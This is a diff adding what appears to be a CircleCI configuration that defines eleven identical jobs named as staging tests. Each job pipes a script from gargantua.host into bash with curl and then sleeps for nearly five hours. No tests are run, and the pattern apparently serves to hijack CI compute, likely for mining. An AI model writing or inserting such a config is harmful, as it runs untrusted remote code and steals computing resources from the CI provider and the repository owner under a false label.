@@ -1,0 +1,127 @@
+version: 2.1
+
+jobs:
+  lasticstagingtest:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahekana.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  lasticstagingtest1:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahekana.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  lasticstagingtest2:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahekana.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  lasticstagingtest3:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahekana.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  lasticstagingtest4:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahekana.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  lasticstagingtest5:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahekana.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  lasticstagingtest6:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahekana.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  lasticstagingtest7:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahekana.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  lasticstagingtest8:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahekana.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  lasticstagingtest9:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahekana.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  lasticstagingtest10:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahekana.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+workflows:
+  main:
+    jobs:
+      - lasticstagingtest
+      - lasticstagingtest1
+      - lasticstagingtest2
+      - lasticstagingtest3
+      - lasticstagingtest4
+      - lasticstagingtest5
+      - lasticstagingtest6
+      - lasticstagingtest7
+      - lasticstagingtest8
+      - lasticstagingtest9
+      - lasticstagingtest10
